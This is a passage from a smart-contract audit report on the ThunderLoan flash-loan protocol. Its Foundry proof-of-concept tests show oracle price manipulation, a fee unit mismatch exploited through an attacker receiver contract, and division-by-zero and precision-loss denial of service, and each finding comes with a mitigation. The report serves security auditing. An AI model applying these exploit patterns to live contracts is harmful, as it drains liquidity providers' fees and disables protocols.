        assertEq(feeAfterUpgrade, expectedCorruptedFee, "Fee after upgrade is corrupted");
        assertNotEq(feeAfterUpgrade, initialFee, "Fee should not be the same after upgrade");
    }
}
```

## Suggested Mitigation
When upgrading contracts, the storage layout must be preserved. To remove a state variable, it should be deprecated but not removed from the contract source. Instead, it can be renamed to indicate it's no longer in use (e.g., `s_feePrecision_deprecated`). New variables must be appended to the end of the existing state variable declarations. To safely remove `s_feePrecision`, a new contract should be written that preserves the variable's storage slot.

```solidity
// src/upgradedProtocol/ThunderLoanUpgraded.sol

contract ThunderLoanUpgraded is ... {
    // ... existing mappings ...
    uint256 private s_feePrecision_deprecated;
    uint256 public s_flashLoanFee;
    mapping(IERC20 => bool) public s_currentlyFlashLoaning;

    // Add new state variables here

    // ...
}
```

## [M-3]. Oracle issue in ThunderLoan::getCalculatedFee

## Description
The protocol calculates flash loan fees using a price feed from `OracleUpgradeable`, which fetches a spot price from an external `TSwapPool`. Spot prices from on-chain automated market makers (AMMs) like Uniswap V2 are susceptible to manipulation within a single atomic transaction. An attacker can use a flash loan from another protocol (e.g., Aave, Uniswap) to execute a large trade on the `TSwapPool`, drastically altering the reported price of an asset. They can then take a flash loan from `ThunderLoan` with a fee calculated based on this manipulated, artificially low price, effectively getting a loan for almost free. This undermines the fee mechanism which is critical for compensating liquidity providers.

## Impact
An attacker can arbitrarily lower the flash-loan fee and therefore borrow the protocol’s liquidity while paying almost no compensation to LPs. Only the fee component is stolen – the principal must still be returned – so the maximum direct loss per attack is bounded by the product of the total liquidity and the nominal fee rate (0.3 %). Repeating the attack drains all revenues and makes providing liquidity unprofitable, but does not endanger the principal.

## Proof of Concept
1. The `ThunderLoan` protocol is configured with a `TSwapPool` (e.g., a Uniswap V2 TKN/WETH pool) as its price oracle for TKN.
2. An attacker takes out a large flash loan of TKN from Aave.
3. The attacker swaps the borrowed TKN for WETH on the `TSwapPool`, causing the price of TKN reported by the pool to plummet.
4. The attacker immediately calls `ThunderLoan.flashloan()` for a large amount of TKN.
5. `ThunderLoan.getCalculatedFee()` is called internally. It queries the `TSwapPool` and gets the manipulated, artificially low price.
6. The resulting fee is negligible. The attacker receives the flash loan.
7. The attacker uses the funds as desired, repays the `ThunderLoan` with the tiny fee.
8. The attacker reverses their initial swap on `TSwapPool` to restore the original price.
9. The attacker repays the Aave flash loan. The net result is that the attacker has paid almost nothing for the `ThunderLoan` services.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";

/// @dev manipulable pool that lets us set an arbitrary spot price
contract ManipulablePool is ITSwapPool {
    uint256 public price = 1e18; // 1 WETH

    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) {
        return price;
    }

    function setPrice(uint256 newPrice) external {
        price = newPrice;
    }
}

/// @dev minimal factory returning the single manipulable pool for every token
contract ManipulableFactory is IPoolFactory {
    ManipulablePool public immutable pool = new ManipulablePool();

    function getPool(address) external view returns (address) {
        return address(pool);
    }
}

contract OracleManipulationTest is Test {
    ThunderLoan   loan;
    ManipulablePool   pool;
    ERC20Mock     token;

    function setUp() public {
        // deploy manipulable oracle stack
        ManipulableFactory factory = new ManipulableFactory();
        pool = factory.pool();

        // deploy ThunderLoan through an ERC1967 proxy so that initialize() is executed in proxy context
        ThunderLoan impl = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(ThunderLoan.initialize.selector, address(factory))
        );
        loan = ThunderLoan(address(proxy));

        // create mock ERC20 token
        token = new ERC20Mock("TKN", "TKN", address(this), 0);

        // allow the token (caller is the owner because it executed initialize())
        loan.setAllowedToken(token, true);
    }

    function testFeeDropsAfterPriceManipulation() public {
        uint256 amount = 1_000 ether;
        uint256 initialFee = loan.getCalculatedFee(token, amount);
        assertGt(initialFee, 0, "baseline fee should be > 0");

        // attacker skews the oracle price downwards
        pool.setPrice(1e12); // price goes from 1e18 to 1e12 (1 million times lower)
        uint256 manipulatedFee = loan.getCalculatedFee(token, amount);

        assertLt(manipulatedFee, initialFee, "fee should have dropped after manipulation");
    }
}

## Suggested Mitigation
Derive fees from a price that cannot be altered within the same transaction. Two standard approaches are (1) a time-weighted average price (TWAP) that uses observations over several blocks (e.g. Uniswap V2 TWAP or Uniswap V3’s built-in oracle) or (2) an external oracle such as Chainlink. In both cases the price must be queried *before* any state-changing operations of the flash-loan transaction start, or cached off-chain and supplied as calldata together with a commitment-scheme that prevents manipulation.

## [M-4]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function calculates the new exchange rate after a fee is accrued. The calculation involves division by `totalSupply()`. If all LPs redeem their shares, `totalSupply()` can become zero. However, fees from previous flash loans can remain in the `AssetToken` contract. If a user then attempts a flash loan using these remaining funds, the call to `updateExchangeRate` from `ThunderLoan.flashloan` will revert with a division-by-zero error, effectively causing a Denial of Service for the flash loan functionality of that token until new liquidity is added.

Vulnerable Code Snippet in `AssetToken.sol`:
```solidity
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    // ...
    uint256 newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply();
    // ...
}
```

## Impact
The `flashloan` function for a given token can be permanently disabled if all liquidity is withdrawn, but a balance of the token remains from collected fees. This prevents a core feature of the protocol from being used under otherwise normal conditions, constituting a liveness failure.

## Proof of Concept
1. Alice deposits 100 WETH into the ThunderLoan pool, becoming an LP. `totalSupply` of the `AssetToken` is now non-zero.
2. Bob takes a flash loan. A fee is collected and remains in the `AssetToken` contract.
3. Alice redeems her entire stake of `AssetToken`s. The `totalSupply` of the `AssetToken` becomes 0.
4. The `AssetToken` contract now has a WETH balance (the fee from Bob's loan) but a `totalSupply` of 0.
5. Charlie attempts to take a flash loan of the WETH remaining in the contract.
6. The `flashloan` function calls `updateExchangeRate`, which attempts to divide by `totalSupply()`. Since `totalSupply()` is 0, the transaction reverts, and Charlie cannot take the loan.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockTSwapPool} from "./mocks/MockTSwapPool.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract DivisionByZeroTest is Test {
    ThunderLoan thunderLoan;
    MockERC20 weth;
    AssetToken wethAssetToken;
    address owner = makeAddr("owner");
    address lp = makeAddr("lp");
    address borrower = makeAddr("borrower");
    FlashLoanReceiverTest receiver;

    function setUp() public {
        vm.prank(owner);
        thunderLoan = new ThunderLoan();

        receiver = new FlashLoanReceiverTest(address(thunderLoan));
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        MockTSwapPool wethPool = new MockTSwapPool();
        wethPool.setPrice(1e18);
        MockPoolFactory poolFactory = new MockPoolFactory();
        poolFactory.setPool(address(weth), address(wethPool));

        vm.prank(owner);
        thunderLoan.initialize(address(poolFactory));

        vm.prank(owner);
        wethAssetToken = AssetToken(thunderLoan.setAllowedToken(weth, true));
    }

    function test_flashloan_DoS_whenPoolIsEmptyButHasFunds() public {
        uint256 lpDepositAmount = 100e18;
        weth.mint(lp, lpDepositAmount);
        vm.startPrank(lp);
        weth.approve(address(thunderLoan), lpDepositAmount);
        thunderLoan.deposit(weth, lpDepositAmount);
        vm.stopPrank();

        uint256 flashLoanAmount = 10e18;
        uint256 fee = thunderLoan.getCalculatedFee(weth, flashLoanAmount);
        weth.mint(address(receiver), fee);
        vm.prank(borrower);
        thunderLoan.flashloan(address(receiver), weth, flashLoanAmount, "");

        uint256 lpAssetTokenBalance = wethAssetToken.balanceOf(lp);
        vm.startPrank(lp);
        thunderLoan.redeem(weth, lpAssetTokenBalance);
        vm.stopPrank();

        assertEq(wethAssetToken.totalSupply(), 0, "Total supply should be zero");
        uint256 poolBalance = weth.balanceOf(address(wethAssetToken));
        assertTrue(poolBalance > 0, "Pool should still have fee balance");

        weth.mint(address(receiver), poolBalance);
        vm.expectRevert(stdError.divisionError); // Revert due to division by zero
        vm.prank(borrower);
        thunderLoan.flashloan(address(receiver), weth, poolBalance, "");
    }
}

contract FlashLoanReceiverTest is IFlashLoanReceiver {
    ThunderLoan private s_thunderLoan;

    constructor(address thunderLoanAddress) {
        s_thunderLoan = ThunderLoan(payable(thunderLoanAddress));
    }

    function executeOperation(
        address tokenAddress,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        s_thunderLoan.repay(IERC20(tokenAddress), amount + fee);
        return true;
    }
}
```

## Suggested Mitigation
Add an explicit check that totalSupply() > 0 and revert otherwise. This guarantees correct accounting and prevents the division-by-zero.

```solidity
error AssetToken__NoSharesExist();

function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 supply = totalSupply();
    if (supply == 0) revert AssetToken__NoSharesExist();

    uint256 newExchangeRate = (s_exchangeRate * (supply + fee)) / supply;
    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;
    emit ExchangeRateUpdated(s_exchangeRate);
}
```

Optionally, ThunderLoan.flashloan can add:
```solidity
if (assetToken.totalSupply() == 0) revert ThunderLoan__PoolIsEmpty();
```

## [M-5]. Integer Overflow/Math issue in ThunderLoan::flashloan

## Description
The `flashloan` function calculates the required fee using `getCalculatedFee`, which returns a value denominated in WETH. The protocol logic then incorrectly treats this WETH-denominated fee as if it were an amount of the borrowed token. The repayment check `endingBalance < startingBalance + fee` incorrectly adds a WETH value (`fee`) to a token balance (`startingBalance`). This allows a borrower to repay a significantly smaller amount than the intended fee, especially if the borrowed token's value is much lower than WETH. This breaks the fee mechanism and starves Liquidity Providers of their revenue.

## Impact
The protocol will not collect the correct fees for flash loans. Borrowers can pay a fraction of the intended fee, leading to a loss of revenue for liquidity providers. If a token's price relative to WETH is very low, the fee paid could be close to zero. This undermines the entire economic incentive of the protocol and leads to a direct loss of yield for LPs.

## Proof of Concept
1. An attacker chooses a token with a very low price compared to WETH (e.g., SHIB).
2. The attacker takes a large flash loan of this token.
3. The `getCalculatedFee` function correctly calculates the fee in WETH value (e.g., 0.03 WETH).
4. The `flashloan` function's repayment check requires the borrower to return `amount + fee`. It incorrectly adds the token `amount` to the WETH `fee` value.
5. If 1 WETH is worth 100 billion SHIB, a fee of 0.03 WETH should be 3 billion SHIB. However, the check will treat `fee` as `0.03e18` wei of SHIB, which is effectively 0 SHIB. The attacker repays the principal and a negligible fee.
6. The attacker successfully gets a near-zero-fee flash loan, breaking the protocol's business model.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {MockTSwapPool} from "../mocks/MockTSwapPool.sol";
import {MockPoolFactory} from "../mocks/MockPoolFactory.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";

contract FlashLoanExploiter is IFlashLoanReceiver {
    ThunderLoan private s_thunderLoan;
    MockERC20 private s_shib;
    uint256 private s_loanAmount;

    constructor(address thunderLoan, address shib) {
        s_thunderLoan = ThunderLoan(thunderLoan);
        s_shib = MockERC20(shib);
    }

    function executeFlashLoan(uint256 amount) external {
        s_loanAmount = amount;
        bytes memory data = abi.encode(1);
        s_thunderLoan.flashloan(address(this), s_shib, amount, data);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Attacker incorrectly repays amount + WETH-denominated fee
        uint256 totalRepayment = amount + fee;
        s_shib.approve(address(s_thunderLoan), totalRepayment);
        s_thunderLoan.repay(s_shib, totalRepayment);
        return true;
    }
}

contract ThunderLoanFeeTest is Test {
    ThunderLoan private thunderLoan;
    MockERC20 private shib;
    MockPoolFactory private poolFactory;
    MockTSwapPool private shibPool;

    address private constant LIQUIDITY_PROVIDER = address(0x1);
    address private constant ATTACKER = address(0x2);

    function setUp() public {
        shib = new MockERC20("SHIBA INU", "SHIB", 18);
        poolFactory = new MockPoolFactory();
        shibPool = new MockTSwapPool();

        // 1 WETH = 100,000,000,000 SHIB
        // Price of 1 SHIB in WETH = 1e18 / 100e9 = 1e7
        shibPool.setPrice(1e7);
        poolFactory.setPool(address(shib), address(shibPool));

        ThunderLoan implementation = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(poolFactory));

        thunderLoan.setAllowedToken(shib, true);

        // LP provides liquidity
        uint256 lpAmount = 1_000_000e9 * 1e18; // 1M billion SHIB
        shib.mint(LIQUIDITY_PROVIDER, lpAmount);
        vm.startPrank(LIQUIDITY_PROVIDER);
        shib.approve(address(thunderLoan), lpAmount);
        thunderLoan.deposit(shib, lpAmount);
        vm.stopPrank();
    }

    function test_Exploit_FeeUnderpayment() public {
        // Attacker sets up exploiter contract
        FlashLoanExploiter exploiter = new FlashLoanExploiter(address(thunderLoan), address(shib));

        // Attacker prepares funds to repay loan + tiny fee
        uint256 loanAmount = 100e9 * 1e18; // 100 billion SHIB
        uint256 feeInWeth = thunderLoan.getCalculatedFee(shib, loanAmount);
        // Correct fee in SHIB = 0.3 WETH = 0.3 * 100e9 SHIB = 30e9 SHIB
        uint256 correctFeeInShib = (feeInWeth * thunderLoan.getFeePrecision()) / shibPool.getPriceOfOnePoolTokenInWeth();
        
        shib.mint(address(exploiter), loanAmount + feeInWeth); // Attacker has enough to repay loan + incorrect fee

        AssetToken assetToken = thunderLoan.getAssetFromToken(shib);
        uint256 balanceBefore = shib.balanceOf(address(assetToken));

        // Attacker executes flash loan
        exploiter.executeFlashLoan(loanAmount);

        uint256 balanceAfter = shib.balanceOf(address(assetToken));
        uint256 profit = balanceAfter - balanceBefore;

        console.log("Intended Fee (SHIB):", correctFeeInShib);
        console.log("Actual Fee Paid (SHIB):", profit);

        // The profit for LPs is just `feeInWeth` wei of SHIB, instead of the correct fee amount.
        assertEq(profit, feeInWeth);
        assertLt(profit, correctFeeInShib, "Attacker paid a fraction of the real fee");
    }
}
```

## Suggested Mitigation
The fee must be converted from a WETH value into an amount of the borrowed token before it is used in the repayment check or passed to the callback. A better long-term fix would be to simplify the fee calculation to avoid the unnecessary and error-prone conversions to and from WETH.

```solidity
// src/protocol/ThunderLoan.sol

function flashloan(
    address receiverAddress,
    IERC20 token,
    uint256 amount,
    bytes calldata params
) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    // ... (checks)
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));

    // FIX: Calculate fee in terms of the token directly
    uint256 feeInToken = (amount * s_flashLoanFee) / s_feePrecision;
    assetToken.updateExchangeRate(feeInToken); // Note: updateExchangeRate formula also needs review

    emit FlashLoan(receiverAddress, token, amount, feeInToken, params);

    s_currentlyFlashLoaning[token] = true;

    assetToken.transferUnderlyingTo(receiverAddress, amount);

    // Call receiver with the correct fee amount in tokens
    Address.functionCall(
        receiverAddress,
        abi.encodeCall(IFlashLoanReceiver.executeOperation, (address(token), amount, feeInToken, msg.sender, params))
    );

    uint256 endingBalance = token.balanceOf(address(assetToken));
    uint256 requiredBalance = startingBalance + feeInToken;

    if (endingBalance < requiredBalance) {
        revert ThunderLoan__NotPaidBack(requiredBalance, endingBalance);
    }
    s_currentlyFlashLoaning[token] = false;
}

// The getCalculatedFee function can be removed or simplified
```

## [M-6]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `updateExchangeRate` function in the `AssetToken` contract calculates the new exchange rate using the formula `(s_exchangeRate * (totalSupply() + fee)) / totalSupply()`. This calculation is vulnerable to a division-by-zero error if `totalSupply()` is zero. This scenario can occur if all liquidity providers redeem their asset tokens, but the `ThunderLoan` contract still holds some underlying tokens from previously collected fees. If a user then attempts a flash loan on these remaining fee-derived assets, the `repay` function in `ThunderLoan` will call `updateExchangeRate`. Since `totalSupply()` is zero, the transaction will revert, effectively locking these funds from being utilized in flash loans until a new LP provides liquidity.

## Impact
The vulnerability leads to a Denial of Service (DoS) for flash loans on assets where all LPs have withdrawn. Fees collected by the protocol for that asset become inaccessible for flash loans, leading to a temporary loss of functionality and locked capital until new liquidity is added. This undermines the protocol's ability to utilize its collected fees.

## Proof of Concept
1. An attacker (or last LP) deposits a minimal amount of an allowed token and immediately redeems, driving AssetToken.totalSupply() to 0 while some fees remain on ThunderLoan.
2. When anyone later triggers a flash-loan on that token, ThunderLoan’s repay() → AssetToken.updateExchangeRate() executes.
3. Because totalSupply() == 0, the multiplication is followed by a division by zero, which reverts and makes every flash-loan on that asset fail until a new deposit is made.
4. The attacker can repeat the deposit-redeem cycle to keep the market frozen at negligible cost (gas + dust token).

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";

// Simple unit test that proves division-by-zero in updateExchangeRate()
contract AssetToken_DivisionByZero is Test {
    AssetToken asset;
    MockERC20 underlying;

    function setUp() public {
        underlying = new MockERC20("Mock", "MCK", 18);
        // Make the test contract the authorised ThunderLoan address
        asset = new AssetToken(address(this), underlying, "aMCK", "aMCK");
    }

    function test_divisionByZero() public {
        // No AssetTokens minted ⇒ totalSupply() == 0
        vm.expectRevert();
        asset.updateExchangeRate(1 ether); // reverts with division by zero
    }
}

## Suggested Mitigation
Add a guard in updateExchangeRate():
if (totalSupply() == 0) return; // nothing to distribute, avoid division by zero

## [M-7]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
In the `updateExchangeRate` function of `AssetToken`, the new exchange rate is calculated. The formula can be simplified to `newExchangeRate = s_exchangeRate + (s_exchangeRate * fee) / totalSupply()`. Due to integer division, the increment `(s_exchangeRate * fee) / totalSupply()` can truncate to zero if the `totalSupply` is significantly larger than `s_exchangeRate * fee`. When this happens, `newExchangeRate` will be equal to `s_exchangeRate`, causing the transaction to revert because of the check `if (newExchangeRate <= s_exchangeRate)`. This effectively creates a Denial of Service for small flash loans in pools with very large liquidity, as they cannot generate a fee large enough to overcome the precision loss.

## Impact
A single large deposit is enough to make every future flash-loan on that token revert, effectively disabling the core feature of the protocol for that asset and blocking fee generation. Funds are not lost, but the lending business logic becomes unusable until liquidity is removed, creating a protocol-wide denial-of-service.

## Proof of Concept
1. A large amount of an asset (e.g., 1 billion WETH) is deposited into `ThunderLoan`, resulting in a very large `totalSupply` for the corresponding `AssetToken`.
2. A user attempts to take a very small flash loan (e.g., 400 wei of WETH), which generates a non-zero but very small fee (e.g., 1 wei).
3. The `repay` function calls `updateExchangeRate`.
4. Inside `updateExchangeRate`, the term `(s_exchangeRate * fee)` is calculated. Given `s_exchangeRate` of `1e18` and a fee of `1`, this is `1e18`.
5. This value is divided by the massive `totalSupply` (e.g., `1e9 * 1e18`). The result of `1e18 / 1e27` is zero.
6. The `newExchangeRate` equals the old `s_exchangeRate`, and the transaction reverts with the `AssetToken__ExhangeRateCanOnlyIncrease` error.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";
import {DeployThunderLoan} from "test/DeployThunderLoan.s.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";

contract FlashLoaner is IFlashLoanReceiver {
    function executeOperation(address token, uint256 amount, uint256 fee, address, bytes calldata) external override returns (bool) {
        MockERC20(token).approve(msg.sender, amount + fee);
        return true;
    }
}

contract PrecisionLossTest is Test, DeployThunderLoan {
    ThunderLoan thunderLoan;
    MockERC20 weth;
    FlashLoaner flashLoaner;
    address lp = makeAddr("lp");
    address borrower = makeAddr("borrower");

    function setUp() public {
        (thunderLoan, ) = deployThunderLoan();
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        flashLoaner = new FlashLoaner();
        thunderLoan.setAllowedToken(IERC20(weth), true);
    }

    function test_poc_PrecisionLossDos() public {
        // 1. Deposit a massive amount of WETH.
        uint256 largeDeposit = 1_000_000_000 * 1e18; // 1 Billion WETH
        weth.mint(lp, largeDeposit);
        vm.startPrank(lp);
        weth.approve(address(thunderLoan), largeDeposit);
        thunderLoan.deposit(IERC20(weth), largeDeposit);
        vm.stopPrank();

        AssetToken assetToken = AssetToken(thunderLoan.getAssetFromToken(IERC20(weth)));
        uint256 exchangeRate = assetToken.getExchangeRate();

        // 2. Attempt a small flash loan that generates a tiny fee.
        uint256 smallLoanAmount = 400; // fee = (400 * 30) / 10000 = 1.2 -> truncated to 1 wei
        weth.mint(address(flashLoaner), 1000);

        // 3. The increment to the exchange rate will be zero due to precision loss,
        // causing newExchangeRate to equal the current exchangeRate, which is forbidden.
        vm.startPrank(borrower);
        bytes4 expectedError = bytes4(keccak256("AssetToken__ExhangeRateCanOnlyIncrease(uint256,uint256)"));
        vm.expectRevert(abi.encodeWithSelector(expectedError, exchangeRate, exchangeRate));
        thunderLoan.flashloan(address(flashLoaner), IERC20(weth), smallLoanAmount, "");
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
Remove the `<=` comparison and only revert when `newExchangeRate` is strictly lower than the current rate. If the value is unchanged (precision loss) simply return without updating the storage:

```solidity
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 supply = totalSupply();
    if (supply == 0) return;

    uint256 newRate = s_exchangeRate * (supply + fee) / supply; // current formula is fine

    // revert only on real decrease (should never happen)
    if (newRate < s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newRate);
    }

    // skip storage write if no observable change
    if (newRate == s_exchangeRate) return;

    s_exchangeRate = newRate;
    emit ExchangeRateUpdated(newRate);
}
```

## [M-8]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `deposit` function in the `ThunderLoan` contract makes an internal call to `assetToken.updateExchangeRate(0)` after minting new asset tokens. The `updateExchangeRate` function is designed to revert if the new exchange rate is not strictly greater than the current rate. When the `fee` parameter is 0, the calculated `newExchangeRate` is exactly equal to `s_exchangeRate`. This causes the check `if (newExchangeRate <= s_exchangeRate)` to evaluate to true, triggering a revert. As a result, any user attempting to make the first deposit for an asset will have their transaction reverted, making it impossible to add liquidity to the protocol and rendering it non-functional.

## Impact
Any call to `deposit()` for a new asset inevitably reverts, so no liquidity can ever be supplied and the whole flash-loan product remains unusable. Existing funds are not at risk, but the protocol is rendered inoperable until the bug is fixed.

## Proof of Concept
1. A liquidity provider attempts to be the first to deposit a supported token (e.g., WETH) by calling `ThunderLoan.deposit()`.
2. The `ThunderLoan` contract correctly mints new `AssetToken`s for the user.
3. It then calls `assetToken.updateExchangeRate(0)`.
4. Inside `updateExchangeRate`, the new exchange rate is calculated. With a zero fee, the new rate is identical to the old rate.
5. The condition `newExchangeRate <= s_exchangeRate` is met, causing the function to revert with the `AssetToken__ExhangeRateCanOnlyIncrease` error.
6. The user's deposit transaction fails, preventing any liquidity from ever entering the protocol.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IPoolFactory} from "../src/interfaces/IPoolFactory.sol";

// Mock PoolFactory for testing
contract MockPoolFactory is IPoolFactory {
    function getPool(address tokenAddress) external view returns (address) {
        return address(0);
    }
}

contract FirstDepositFailTest is Test {
    ThunderLoan thunderLoan;
    ERC20Mock weth;
    address USER = makeAddr("user");
    address owner;

    function setUp() public {
        owner = address(this);
        thunderLoan = new ThunderLoan();
        thunderLoan.initialize(address(new MockPoolFactory()));

        weth = new ERC20Mock();

        vm.prank(owner);
        thunderLoan.setAllowedToken(weth, true);

        weth.mint(USER, 100 ether);
    }

    function test_Fail_FirstDepositReverts() public {
        vm.startPrank(USER);
        weth.approve(address(thunderLoan), 10 ether);

        bytes4 expectedError = bytes4(keccak256("AssetToken__ExhangeRateCanOnlyIncrease(uint256,uint256)"));
        vm.expectRevert(expectedError);

        thunderLoan.deposit(weth, 10 ether);
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
The check in `updateExchangeRate` should not revert if the exchange rate remains the same. The most efficient fix is to add a guard clause to return early if the fee is zero. Alternatively, change the conditional check to only revert if the rate strictly decreases.

```solidity
// In AssetToken.sol
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    if (fee == 0) {
        return; // Most efficient fix
    }
    uint256 newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply();
    if (newExchangeRate < s_exchangeRate) { // Alternative fix: only revert if rate decreases
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;

    emit ExchangeRateUpdated(s_exchangeRate);
}
```

## [M-9]. Flash Loan Economic Manipulation issue in ThunderLoan::getCalculatedFee

## Description
The protocol calculates fees for deposits and flash loans using a price feed from an external oracle (`TSwapPool`). The implementation directly uses the spot price from this oracle without any safeguards like Time-Weighted Average Prices (TWAP). Spot prices from on-chain exchanges are susceptible to manipulation within a single transaction, typically through flash loans from other protocols. An attacker can exploit this to artificially lower the reported price of an asset, thereby reducing the fees they have to pay for depositing or taking a flash loan. This undermines the protocol's fee mechanism and leads to a loss of revenue for liquidity providers.

## Impact
By atomically manipulating the spot price reported by the TSwap pool, a borrower can shrink the flash-loan fee to an arbitrary low value. Repeating the attack allows rent-free usage of the pool and continuously diverts protocol revenue that should have been distributed to liquidity providers. The principal supplied by LPs remains safe, but the fee mechanism – the only yield source – can be fully bypassed, making the product economically non-viable.

## Proof of Concept
1. Oracle price is 20 WETH per LINK. A 100 000 LINK flash loan would be charged fee = amount * price * feeRate / 1e18.
2. Attacker first swaps LINK→WETH inside the TSwap pool to push price down to 1 WETH per LINK inside the same transaction.
3. He then calls flashloan(); ThunderLoan reads the manipulated price and charges only 1/20 of the correct fee.
4. After receiving the loan the attacker immediately swaps WETH→LINK back, restoring the price and leaving no obvious traces while having saved 95 % of the fee.
5. The manoeuvre can be repeated every block; only protocol revenue is affected, liquidity cannot be stolen.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/* ----------------- Mocks ----------------- */
interface ITSwapPool {
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256);
    function setPrice(uint256 newPrice) external;
}

contract MockTSwapPool is ITSwapPool {
    uint256 private price;
    constructor(uint256 start) { price = start; }
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) { return price; }
    function setPrice(uint256 newPrice) external { price = newPrice; }
}

interface IPoolFactory { function getPool(address) external view returns (address); }

contract MockPoolFactory is IPoolFactory {
    mapping(address => address) pools;
    function getPool(address t) external view returns (address) { return pools[t]; }
    function setPool(address t, address p) external { pools[t] = p; }
}

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

/* -------------- Exploit demonstration -------------- */
contract OracleManipulationTest is Test {
    ThunderLoan internal loan;
    MockERC20  internal link;
    MockTSwapPool internal pool;
    MockPoolFactory internal factory;

    function setUp() public {
        link = new MockERC20("LINK", "LINK");
        pool = new MockTSwapPool(20 ether);               // 1 LINK = 20 WETH
        factory = new MockPoolFactory();
        factory.setPool(address(link), address(pool));

        loan = new ThunderLoan();
        loan.initialize(address(factory));
        loan.setAllowedToken(link, true);

        link.mint(address(this), 1_000_000 ether);
        link.approve(address(loan), type(uint256).max);
        loan.deposit(link, 1_000_000 ether);              // seed liquidity
    }

    function testFeeManipulation() public {
        uint256 amount = 100_000 ether;
        uint256 correctFee = loan.getCalculatedFee(link, amount);

        pool.setPrice(1 ether);                           // push price down 20×
        uint256 manipulatedFee = loan.getCalculatedFee(link, amount);

        assertLt(manipulatedFee, correctFee, "fee should fall after price drop");
        assertEq(manipulatedFee, correctFee / 20, "fee scales linearly with price");
    }
}

## Suggested Mitigation
Use an oracle that cannot be moved significantly in a single transaction. Options include
• Integrating a TWAP mechanism (e.g., Uniswap V2/V3 cumulative price over 30 min) before consuming the price.
• Relying on Chainlink data feeds for popular assets and falling back to TWAP for long-tail tokens.
Additionally, cache the price at the beginning of the block or cap the maximum allowed deviation since last update.

## [M-10]. Upgradeability Initializer Safety issue in OracleUpgradeable::__Oracle_init_unchained

## Description
